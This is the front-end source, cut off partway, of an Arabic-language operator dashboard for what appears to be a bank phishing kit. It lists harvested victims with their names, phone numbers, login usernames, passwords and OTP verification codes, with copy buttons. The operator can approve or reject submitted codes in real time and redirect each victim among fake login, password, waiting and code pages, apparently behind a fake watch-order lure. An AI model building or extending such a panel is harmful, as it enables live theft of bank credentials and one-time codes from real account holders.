<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);color:#fff}
::-webkit-scrollbar{width:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}

/* LOGIN */
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.login-box{background:rgba(30,41,59,.8);border:1px solid rgba(51,65,85,.5);border-radius:24px;
  padding:48px 40px;width:100%;max-width:420px;box-shadow:0 25px 60px rgba(0,0,0,.4);text-align:center;backdrop-filter:blur(10px)}
.login-box h1{font-size:24px;font-weight:800;margin:16px 0 6px}
.login-box .sub{color:rgba(255,255,255,.5);font-size:13px;margin-bottom:32px}
.login-box input{width:100%;padding:14px 18px;border:1.5px solid rgba(51,65,85,.5);border-radius:12px;
  font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;background:#0f172a;color:#fff;transition:.2s}
.login-box input:focus{border-color:#1B7A3D}
.login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#1B7A3D,#16a34a);color:#fff;border:none;
  border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
.login-err{color:#f87171;font-size:12px;margin-bottom:10px;display:none}

/* LAYOUT */
.layout{display:none;flex-direction:column;height:100vh;overflow:hidden}

/* TOPBAR */
.topbar{background:rgba(15,23,42,.95);backdrop-filter:blur(10px);padding:12px 24px;
  display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(27,122,61,.3)}
.tb-r{display:flex;align-items:center;gap:12px}
.tb-r .ico{width:36px;height:36px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:10px;
  display:flex;align-items:center;justify-content:center;font-size:18px}
.tb-r .t{color:#1B7A3D;font-weight:800;font-size:16px}
.tb-r .sp{color:rgba(255,255,255,.4);font-size:13px}
.tb-r .bn{color:rgba(255,255,255,.5);font-size:13px}
.tb-l{display:flex;align-items:center;gap:12px}
.tb-visitors{display:inline-flex;align-items:center;gap:8px;background:rgba(245,158,11,.18);
  border:1px solid rgba(245,158,11,.45);color:#fbbf24;border-radius:999px;padding:6px 14px;
  font-size:13px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;transition:.2s}
.tb-visitors:hover{background:rgba(245,158,11,.28)}
.tb-visitors .num{background:rgba(245,158,11,.35);padding:2px 8px;border-radius:10px;color:#fff;font-weight:800;min-width:24px;text-align:center}
.tb-online{display:inline-flex;align-items:center;gap:6px;color:#86efac;background:rgba(34,197,94,.12);
  border:1px solid rgba(34,197,94,.3);border-radius:999px;padding:6px 10px;font-size:12px;font-weight:700}
.tb-online .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 7px #22c55e}
.tb-admin{color:rgba(255,255,255,.6);font-size:13px}
.tb-logout{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171;
  border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;font-weight:700}

/* STATS */
.stats{padding:16px 24px;display:grid;grid-template-columns:repeat(5,1fr);gap:16px;
  border-bottom:1px solid rgba(255,255,255,.06);flex-shrink:0}
.sc{border-radius:14px;padding:14px 16px;text-align:center;transition:.15s;cursor:default}
.sc:hover{transform:translateY(-2px)}
.sc-v{font-size:24px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:6px}
.sc-v .live{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 1.5s infinite}
.sc-lb{font-size:12px;color:rgba(255,255,255,.5);margin-top:4px}
.sc-hint{font-size:10px;margin-top:2px;font-weight:700}

/* BODY 3-COL */
.body{display:flex;height:calc(100vh - 160px)}

/* COL ACTIVE */
.col-a{width:280px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0;background:rgba(59,130,246,.03)}
.col-a-head{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(59,130,246,.08);
  position:sticky;top:0;z-index:1;display:flex;align-items:center;gap:8px;font-weight:800;font-size:13px;color:#3b82f6}
.col-a-head .gd{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e;animation:pulse 1.5s infinite}
.ac{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s}
.ac:hover{background:rgba(59,130,246,.08)}
.ac.sel{background:rgba(59,130,246,.15)}
.ac-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.ac-n{font-weight:700;font-size:12px}
.pg-badge{color:#fff;border-radius:8px;padding:1px 6px;font-size:9px;font-weight:700;display:inline-block}
.ac-info{display:flex;gap:8px;font-size:10px;color:rgba(255,255,255,.5)}
.ac-info .otp{color:#fbbf24;font-weight:700}
.al-empty{padding:30px 20px;text-align:center;color:rgba(255,255,255,.3)}
.al-empty .ic{font-size:32px;margin-bottom:6px}
.al-empty p{font-size:12px}

/* COL ORDERS */
.col-o{width:320px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0}
.col-o-head{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(27,122,61,.06);position:sticky;top:0;z-index:1}
.col-o-head .t{font-weight:800;font-size:13px;color:#1B7A3D;margin-bottom:8px}
.col-o-head input{width:100%;padding:8px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
  border-radius:8px;color:#fff;font-size:12px;font-family:'Cairo',sans-serif;outline:none;box-sizing:border-box}
.oc{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s;position:relative}
.oc:hover{background:rgba(27,122,61,.06)}
.oc.sel{background:rgba(27,122,61,.15)}
.oc-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.oc-nm{display:flex;align-items:center;gap:6px}
.oc-nm .on{width:6px;height:6px;border-radius:50%;background:#22c55e}
.oc-nm span{font-weight:700;font-size:12px}
.oc-info{color:rgba(255,255,255,.4);font-size:10px}
.oc-otp{display:inline-block;margin-top:4px;background:rgba(245,158,11,.15);border-radius:4px;
  padding:1px 6px;font-size:10px;color:#fbbf24;font-weight:700}
.oc-del{position:absolute;top:6px;left:6px;border-radius:5px;padding:2px 6px;font-size:10px;
  cursor:pointer;font-family:'Cairo',sans-serif;font-weight:700;transition:.15s}
.oc-del.normal{background:rgba(220,38,38,.1);border:1px solid rgba(220,38,38,.2);color:#f87171}
.oc-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}
.ol-empty{padding:40px 20px;text-align:center;color:rgba(255,255,255,.3)}
.ol-empty .ic{font-size:40px;margin-bottom:10px}
.ol-empty p{font-size:13px}

/* COL DETAIL */
.col-d{flex:1;overflow-y:auto;padding:20px 24px}
.d-empty{display:flex;align-items:center;justify-content:center;height:100%;color:rgba(255,255,255,.3);
  flex-direction:column;gap:12px}
.d-empty .ic{font-size:56px}

/* DETAIL HEADER */
.dh{background:rgba(255,255,255,.04);border-radius:14px;padding:16px 20px;margin-bottom:16px;
  border:1px solid rgba(255,255,255,.08);display:flex;align-items:center;justify-content:space-between}
.dh-left{display:flex;align-items:center;gap:14px}
.dh-av{width:44px;height:44px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:12px;
  display:flex;align-items:center;justify-content:center;font-size:20px}
.dh-name{font-weight:800;font-size:18px}
.dh-meta{display:flex;align-items:center;gap:8px;margin-top:4px}
.dh-time{color:rgba(255,255,255,.4);font-size:11px}
.dh-del{border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.dh-del.normal{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171}
.dh-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}

/* SECRET CODES */
.sec-codes{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(245,158,11,.03));
  border:1px solid rgba(245,158,11,.3);border-radius:14px;padding:16px;margin-bottom:16px}
.sec-codes h3{font-weight:800;font-size:14px;color:#f59e0b;margin:0 0 12px}
.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.code-card{background:rgba(0,0,0,.3);border-radius:10px;padding:12px;border:1px solid rgba(245,158,11,.2);text-align:center}
.code-card .lbl{font-size:10px;color:rgba(255,255,255,.5);margin-bottom:4px}
.code-card .val{font-weight:800;font-size:20px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all}
.code-card .cp{margin-top:6px;background:rgba(255,255,255,.08);border:none;border-radius:6px;padding:3px 8px;
  color:#fff;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.code-card .cp.ok{color:#4ade80}
.code-empty{background:rgba(0,0,0,.15);border-radius:10px;padding:12px;border:1px dashed rgba(255,255,255,.08);text-align:center}
.code-empty .lbl{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:4px}
.code-empty .val{color:rgba(255,255,255,.3);font-size:12px}

/* ALL DATA */
.sec-data{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
.sec-data h3{font-weight:800;font-size:14px;color:#1B7A3D;margin:0 0 12px}
.data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.data-item{background:rgba(255,255,255,.04);border-radius:10px;padding:12px;position:relative}
.data-item.hl{border:1px solid rgba(245,158,11,.2)}
.data-item:not(.hl){border:1px solid rgba(255,255,255,.06)}
.data-item .lbl{color:rgba(255,255,255,.4);font-size:10px;margin-bottom:4px;display:flex;align-items:center;gap:4px}
.data-item .val{font-weight:700;font-size:13px;word-break:break-all}
.data-item .val.hl{color:#fbbf24}
.data-item .cp{margin-top:6px;background:rgba(255,255,255,.06);border:none;border-radius:5px;padding:2px 8px;
  color:rgba(255,255,255,.5);font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.data-item .cp.ok{color:#4ade80}

/* JOURNEY CONTROL */
.sec-ctrl{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
.sec-ctrl h4{font-weight:700;font-size:14px;margin:0 0 12px}
.approve-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
.approve-row button{border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.btn-ok{background:#16a34a;color:#fff}
.btn-no{background:#dc2626;color:#fff}
.redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
.redir-grid button{border:none;border-radius:8px;padding:8px 6px;font-size:11px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
.redir-grid button:hover{opacity:.85}

/* CUSTOM MSG */
.sec-msg{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;border:1px solid rgba(255,255,255,.06);margin-bottom:16px}
.sec-msg h4{font-weight:700;font-size:14px;margin:0 0 10px}
.sec-msg textarea{width:100%;padding:10px;border:1px solid rgba(255,255,255,.1);border-radius:8px;
  background:rgba(255,255,255,.05);color:#fff;font-size:13px;font-family:'Cairo',sans-serif;
  resize:vertical;box-sizing:border-box;outline:none}
.sec-msg button{margin-top:8px;background:#1B7A3D;color:#fff;border:none;border-radius:8px;
  padding:8px 18px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}

/* DELETE SECTION */
.sec-del{background:rgba(220,38,38,.05);border-radius:14px;padding:16px;border:1px solid rgba(220,38,38,.2);margin-bottom:16px}
.sec-del h4{font-weight:700;font-size:14px;color:#f87171;margin:0 0 10px;display:flex;align-items:center;gap:8px}
.sec-del .del-msg{padding:8px 10px;border-radius:8px;margin-bottom:10px;font-size:12px;font-weight:700;text-align:center}
.sec-del .del-msg.ok{background:rgba(22,163,74,.2);color:#4ade80;border:1px solid rgba(22,163,74,.4)}
.sec-del .del-msg.err{background:rgba(220,38,38,.2);color:#ef4444;border:1px solid rgba(220,38,38,.4)}
.btn-del-all{width:100%;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;border:1px solid rgba(220,38,38,.4);
  border-radius:8px;padding:10px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 12px rgba(220,38,38,.2)}
.del-confirm-row{display:flex;gap:8px}
.del-confirm-row button{flex:1;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.del-warn{color:#fbbf24;font-size:12px;font-weight:700;margin-bottom:10px;text-align:center}
.sec-del .note{color:rgba(255,255,255,.4);font-size:11px;margin-top:8px}

/* MODAL */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(10,15,29,.82);backdrop-filter:blur(10px);
  z-index:9999;align-items:center;justify-content:center;padding:20px}
.modal-bg.show{display:flex}
.modal{background:#0f172a;border:1px solid rgba(245,158,11,.35);border-radius:20px;
  width:100%;max-width:860px;max-height:90vh;display:flex;flex-direction:column;
  box-shadow:0 25px 65px rgba(0,0,0,.65);overflow:hidden}
.modal-head{padding:18px 24px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;
  align-items:center;justify-content:space-between;background:rgba(245,158,11,.05)}
.modal-head h3{font-size:17px;font-weight:800;color:#f59e0b}
.modal-head p{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
.modal-head .btns{display:flex;gap:8px}
.modal-head .btns button{border-radius:8px;padding:6px 12px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.modal-body{padding:20px 24px;overflow-y:auto;flex:1}
.vm-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px}
.vm-sc{border-radius:14px;padding:14px;text-align:center}
.vm-sc .n{font-size:26px;font-weight:800}
.vm-sc .l{font-size:12px;color:rgba(255,255,255,.6);margin-top:4px}
.vm-tabs{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.vm-tabs .btns{display:flex;gap:8px}
.vm-tabs button{border:none;border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff}
.vm-tabs input{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:8px;
  padding:6px 12px;font-size:12px;color:#fff;font-family:'Cairo',sans-serif;outline:none;min-width:220px}
.vm-table{width:100%;border-collapse:collapse;font-size:12px;text-align:right}
.vm-table th{padding:10px 14px;font-weight:700;color:rgba(255,255,255,.6);background:rgba(255,255,255,.04);
  border-bottom:1px solid rgba(255,255,255,.08)}
.vm-table td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04)}
.vm-table .online{display:inline-flex;align-items:center;gap:5px;color:#4ade80;font-size:11px;font-weight:700}
.vm-table .online .d{width:6px;height:6px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e}
.vm-table .offline{color:rgba(255,255,255,.4);font-size:11px}
.vm-table .redir-btns{display:inline-flex;gap:4px}
.vm-table .redir-btns button{border-radius:6px;padding:3px 8px;font-size:10px;cursor:pointer;
  font-family:'Cairo',sans-serif;font-weight:700;border:1px solid;color:#fff}
.vm-footer{margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.08);
  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
.vm-footer .note{font-size:11px;color:rgba(255,255,255,.4)}
.vm-msg{padding:8px 12px;border-radius:8px;margin-bottom:14px;background:rgba(34,197,94,.15);
  border:1px solid rgba(34,197,94,.35);color:#86efac;font-size:12px;font-weight:700;text-align:center;display:none}

/* NOTIF */
.notif{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#1B7A3D;color:#fff;
  padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:10000;
  box-shadow:0 8px 24px rgba(0,0,0,.3);display:none;animation:slideD .3s ease}
@keyframes slideD{from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

@media(max-width:1100px){.col-a{width:240px}.col-o{width:280px}}
@media(max-width:800px){
  .body{flex-direction:column;overflow-y:auto}
  .col-a,.col-o{width:100%;max-height:220px;overflow-y:auto}
  .col-d{min-height:500px}
  .stats{grid-template-columns:repeat(3,1fr)}
}
</style>
</head>
<body>

<div class="notif" id="notif"></div>
<div class="modal-bg" id="vModal"></div>

<!-- LOGIN -->
<div class="login-wrap" id="loginScreen">
  <div class="login-box">
    <div style="font-size:48px">🏦</div>
    <h1>لوحة التحكم</h1>
    <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<!-- DASHBOARD -->
<div class="layout" id="layout">

  <!-- TOPBAR -->
  <div class="topbar">
    <div class="tb-r">
      <div class="ico">🏦</div>
      <span class="t">لوحة التحكم</span>
      <span class="sp">|</span>
      <span class="bn">SGA</span>
    </div>
    <div class="tb-l">
      <button class="tb-visitors" onclick="openVM('all')">
        <span>📊</span><span>إجمالي الزوار:</span><span class="num" id="tbV">0</span>
      </button>
      <span class="tb-online"><span class="dot"></span> الزوار الآن: <strong id="tbO">0</strong></span>
      <span class="tb-admin">👤 Admin</span>
      <button class="tb-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <!-- STATS -->
  <div class="stats" id="statsRow"></div>

  <!-- BODY -->
  <div class="body">
    <div class="col-a">
      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
      <div id="aList"></div>
    </div>
    <div class="col-o">
      <div class="col-o-head">
        <div class="t">📋 جميع الطلبات (<span id="oCnt">0</span>)</div>
        <input type="text" id="sInp" placeholder="🔍 بحث بالاسم أو الهاتف..." oninput="filterOrders()">
      </div>
      <div id="oList"></div>
    </div>
    <div class="col-d" id="colD">
      <div class="d-empty" id="dEmpty"><div class="ic">👈</div><p>اختر طلباً لعرض تفاصيله</p></div>
      <div id="dCont" style="display:none"></div>
    </div>
  </div>

</div>

<script>
const PL={home:'الرئيسية',index:'الرئيسية',order:'صفحة الطلب',login:'تسجيل الدخول',password:'الرمز السري',
  waiting:'بانتظار الموافقة',code:'رمز التحقق','code-waiting':'بانتظار الرمز',success:'مكتمل'};
const PC={home:'#6b7280',index:'#6b7280',order:'#0ea5e9',login:'#0891b2',password:'#a855f7',
  waiting:'#7c3aed',code:'#d97706','code-waiting':'#f59e0b',success:'#16a34a'};
const SL={pending:'قيد الانتظار',confirmed:'مقبول',rejected:'مرفوض',
  code_pending:'بانتظار الرمز',code_confirmed:'تم التأكيد',code_rejected:'رمز مرفوض'};

let TOKEN=localStorage.getItem('admin_token')||'',orders=[],visitors=[],allVisitors=[],
    selId=null,sQ='',prevIds=new Set(),delConfId=null,detDelConf=false;

function api(m,u,b){
  const o={method:m,headers:{'Content-Type':'application/json'}};
  if(TOKEN)o.headers.Authorization='Bearer '+TOKEN;
  if(b)o.body=JSON.stringify(b);
  return fetch(u,o).then(r=>{
    if(r.status===401&&!u.includes('/admin/login')){TOKEN='';localStorage.removeItem('admin_token');
      document.getElementById('layout').style.display='none';document.getElementById('loginScreen').style.display='flex';}
    return r.json();
  });
}
async function doLogin(){
  const r=await api('POST','/api/admin/login',{password:document.getElementById('passInput').value});
  if(r.success){TOKEN=r.token;localStorage.setItem('admin_token',TOKEN);showDash();}
  else document.getElementById('loginErr').style.display='block';
}
function doLogout(){TOKEN='';localStorage.removeItem('admin_token');
  document.getElementById('layout').style.display='none';document.getElementById('loginScreen').style.display='flex';}
document.getElementById('passInput').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
async function checkAuth(){
  if(!TOKEN)return;
  try{const r=await fetch('/api/orders',{headers:{Authorization:'Bearer '+TOKEN}});
    if(r.status===200){const d=await r.json();if(d.orders)return showDash();}}catch(e){}
  TOKEN='';localStorage.removeItem('admin_token');
}
function showDash(){document.getElementById('loginScreen').style.display='none';
  document.getElementById('layout').style.display='flex';loadOrders();loadVisitors();}

// SOUND
function playSound(){try{const c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();
  o.connect(g);g.connect(c.destination);g.gain.setValueAtTime(.3,c.currentTime);o.type='sine';
  o.frequency.setValueAtTime(800,c.currentTime);o.frequency.setValueAtTime(1200,c.currentTime+.1);
  g.gain.exponentialRampToValueAtTime(.01,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4);}catch(e){}}
function showNotif(m){const el=document.getElementById('notif');el.textContent=m;el.style.display='block';
  setTimeout(()=>el.style.display='none',4000);}

function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):''}
function fmtDate(d){if(!d)return'—';try{const x=new Date(d);return x.toLocaleDateString('ar-EG',{year:'numeric',month:'2-digit',day:'2-digit'})+' '+
  x.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:!0});}catch(e){return'—';}}
function pgBadge(pg,extra){const c=PC[pg]||'#6b7280',l=PL[pg]||pg||'الرئيسية';
  return `<span class="pg-badge" style="background:${c}"${extra||''}>${l}</span>`;}

// STATS
function renderStats(){
  const active=orders.filter(isActive),done=orders.filter(o=>o.status==='confirmed'||o.status==='code_confirmed');
  const cards=[
    {label:'إجمالي العملاء',value:orders.length,color:'#1B7A3D',bg:'rgba(27,122,61,0.1)',border:'rgba(27,122,61,0.25)',icon:'👥'},
    {label:'إجمالي الزوار',value:allVisitors.length||orders.length,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',click:'all',hint:'عرض السجل ↗'},
    {label:'الزوار الحاليين',value:visitors.length,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,click:'online',hint:'المتصلين الآن ↗'},
    {label:'عملاء نشطين',value:active.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true},
    {label:'مكتملين',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'}
  ];
  document.getElementById('statsRow').innerHTML=cards.map(c=>{
    const cl=c.click?'cursor:pointer':'cursor:default';
    const onclick=c.click?` onclick="openVM('${c.click}')"`:'';
    const live=c.live&&c.value>0?`<span class="live" style="background:${c.color}"></span>`:'';
    const hint=c.hint?`<div class="sc-hint" style="color:${c.color}">${c.hint}</div>`:'';
    return `<div class="sc" style="background:${c.bg};border:1px solid ${c.border};${cl}"${onclick}>
      <div class="sc-v">${live}${c.icon} ${c.value}</div>
      <div class="sc-lb">${c.label}</div>${hint}</div>`;
  }).join('');
  document.getElementById('tbV').textContent=allVisitors.length||orders.length;
  document.getElementById('tbO').textContent=visitors.length;
  document.getElementById('aCnt').textContent=active.length;
  document.getElementById('oCnt').textContent=orders.length;
}

function isActive(o){return o.current_page&&o.current_page!=='success'&&
  !['confirmed','rejected','code_confirmed','code_rejected'].includes(o.status);}
function isOnline(o){return visitors.some(v=>{const vp=(v.current_page||'').replace('-fr','');
  const op=(o.current_page||'');return vp===op||vp===op.replace('.html','');});}

// ACTIVE SIDEBAR
function renderActive(){
  const el=document.getElementById('aList'),list=orders.filter(isActive);
  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
  el.innerHTML=list.map(o=>{
    const otp=o.verification_code?`<span class="otp">OTP: ${esc(o.verification_code)}</span>`:'';
    return `<div class="ac${o.id===selId?' sel':''}" onclick="selectOrder(${o.id})">
      <div class="ac-t"><span class="ac-n">${esc(o.name)||'مجهول'}</span>${pgBadge(o.current_page)}</div>
      <div class="ac-info">${o.phone?`<span>📱 ${esc(o.phone)}</span>`:''}${otp}</div></div>`;
  }).join('');
}

// ORDERS LIST
function renderOrders(){
  const el=document.getElementById('oList');
  let list=orders;
  if(sQ){const q=sQ.toLowerCase();list=orders.filter(o=>(o.name||'').toLowerCase().includes(q)||(o.phone||'').includes(q));}
  if(!list.length){el.innerHTML='<div class="ol-empty"><div class="ic">📭</div><p>لا توجد طلبات</p></div>';return;}
  el.innerHTML=list.map(o=>{
    const on=isOnline(o)?'<div class="on"></div>':'';
    const otp=o.verification_code?`<div class="oc-otp">📲 OTP: ${esc(o.verification_code)}</div>`:'';
    const isDC=delConfId===o.id;
    return `<div class="oc${o.id===selId?' sel':''}" onclick="selectOrder(${o.id})">
      <div class="oc-t"><div class="oc-nm">${on}<span>${esc(o.name)||'مجهول'}</span></div>${pgBadge(o.current_page)}</div>
      <div class="oc-info">📱 ${esc(o.phone)||'—'} • 🕐 ${fmtDate(o.created_at)}</div>
      ${otp}
      <button class="oc-del ${isDC?'confirm':'normal'}" onclick="event.stopPropagation();oDel(${o.id})">${isDC?'⚠️ تأكيد':'✕'}</button>
    </div>`;
  }).join('');
}
function filterOrders(){sQ=document.getElementById('sInp').value.trim();renderOrders();}
function oDel(id){if(delConfId===id){api('DELETE','/api/orders/'+id).then(()=>{
    delConfId=null;if(selId===id)closeDetail();loadOrders();});}
  else{delConfId=id;renderOrders();setTimeout(()=>{if(delConfId===id){delConfId=null;renderOrders();}},3000);}}

// DETAIL
function selectOrder(id){selId=id;delConfId=null;detDelConf=false;
  const o=orders.find(x=>x.id===id);if(o)renderDetail(o);renderActive();renderOrders();}
function closeDetail(){selId=null;document.getElementById('dEmpty').style.display='flex';
  document.getElementById('dCont').style.display='none';renderActive();renderOrders();}

function renderDetail(o){
  document.getElementById('dEmpty').style.display='none';
  const dc=document.getElementById('dCont');dc.style.display='block';
  const p=PC[o.current_page]||'#6b7280',pl=PL[o.current_page]||o.current_page||'الرئيسية';
  const active=orders.filter(isActive);
  let h='';

  // HEADER
  h+=`<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>
    <div class="dh-name">${esc(o.name)||'مجهول'}</div>
    <div class="dh-meta"><span class="pg-badge" style="background:${p}">${pl}</span>
    <span class="dh-time">🕐 ${fmtDate(o.created_at)}</span></div></div></div>
    <button class="dh-del ${detDelConf?'confirm':'normal'}" onclick="detDel(${o.id})">${detDelConf?'⚠️ تأكيد':'🗑️ حذف'}</button></div>`;

  // SECRET CODES
  h+=`<div class="sec-codes"><h3>🔑 الرموز السرية</h3><div class="codes-grid">`;
  h+=codeCard('📱 اسم المستخدم',o.login_username);
  h+=codeCard('🔒 الرمز السري',o.login_password);
  h+=codeCard('📲 رمز التحقق',o.verification_code);
  h+=`</div></div>`;

  // ALL DATA
  const allData=[
    {icon:'🕐',label:'تاريخ ووقت المعاملة',value:fmtDate(o.created_at),color:'#1B7A3D',hl:true},
    {icon:'📱',label:'رقم الهاتف',value:o.phone,color:'#3b82f6'},
    {icon:'👤',label:'الاسم الكامل',value:o.name,color:'#1B7A3D'},
    {icon:'👁️',label:'اسم المستخدم',value:o.login_username,color:'#0891b2'},
    {icon:'🔑',label:'الرمز السري',value:o.login_password,color:'#ef4444'},
    {icon:'📲',label:'رمز التحقق',value:o.verification_code,color:'#f59e0b',hl:true},
    {icon:'🎨',label:'لون الساعة',value:o.watch_color,color:'#8b5cf6'},
    {icon:'📍',label:'الصفحة الحالية',value:pl,color:'#6b7280'},
    {icon:'📊',label:'الحالة',value:SL[o.status]||o.status,color:'#6b7280'}
  ].filter(d=>d.value&&d.value!=='-'&&d.value!=='—');

  h+=`<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">`;
  allData.forEach((d,i)=>{
    const hlc=d.hl?' hl':'';
    const valc=d.hl?' hl':'';
    h+=`<div class="data-item${hlc}"><div class="lbl">${d.icon} ${d.label}</div>
      <div class="val${valc}">${esc(d.value)}</div>
      <button class="cp" onclick="doCopy(this,'${esc(d.value)}')">نسخ</button></div>`;
  });
  h+=`</div></div>`;

  // JOURNEY CONTROL
  h+=`<div class="sec-ctrl"><h4>🎮 التحكم في رحلة العميل</h4>`;
  if(o.status==='pending'||o.current_page==='waiting'){
    h+=`<div class="approve-row">
      <button class="btn-ok" onclick="doStatus(${o.id},'confirmed')">✅ موافقة</button>
      <button class="btn-no" onclick="doStatus(${o.id},'rejected')">❌ رفض</button></div>`;
  }else if(o.status==='code_pending'||o.current_page==='code-waiting'){
    h+=`<div class="approve-row">
      <button class="btn-ok" onclick="doStatus(${o.id},'code_confirmed')">✅ قبول الرمز</button>
      <button class="btn-no" onclick="doStatus(${o.id},'code_rejected')">❌ رفض الرمز</button></div>`;
  }else{
    h+=`<div class="approve-row">
      <button class="btn-ok" onclick="doStatus(${o.id},'confirmed')">✅ قبول</button>
      <button class="btn-no" onclick="doStatus(${o.id},'rejected')">❌ رفض</button></div>`;
  }
  const pages=[
    {l:'→ تسجيل دخول',pg:'login.html',c:'#0891b2'},
    {l:'→ الرمز السري',pg:'password.html',c:'#a855f7'},
    {l:'→ بانتظار الموافقة',pg:'waiting.html',c:'#7c3aed'},
    {l:'→ رمز التحقق',pg:'code.html',c:'#d97706'},
    {l:'→ بانتظار الرمز',pg:'code-waiting.html',c:'#f59e0b'},
